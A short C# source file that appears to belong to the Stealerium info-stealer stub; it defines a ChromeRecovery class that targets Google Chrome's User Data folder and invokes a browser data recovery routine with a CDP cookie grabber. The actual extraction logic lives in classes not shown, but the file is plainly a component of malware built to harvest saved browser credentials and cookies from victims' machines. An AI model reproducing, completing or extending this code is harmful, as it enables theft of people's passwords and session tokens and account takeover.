using System.IO;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Target.Browsers.Common.Recovery;

namespace Stealerium.Stub.Target.Browsers.Chromium
{
    internal sealed class ChromeRecovery : ChromiumBasedRecovery
    {
        public ChromeRecovery(string savePath) : base(
            savePath,
            "Google Chrome",
            Path.Combine(Paths.Lappdata, "Google\\Chrome\\User Data"),
            CdpCookieGrabber.BrowserType.Chrome)
        {
        }

        public static void Run(string savePath)
        {
            var recovery = new ChromeRecovery(savePath);
            recovery.RecoverBrowserData();
        }
    }
}
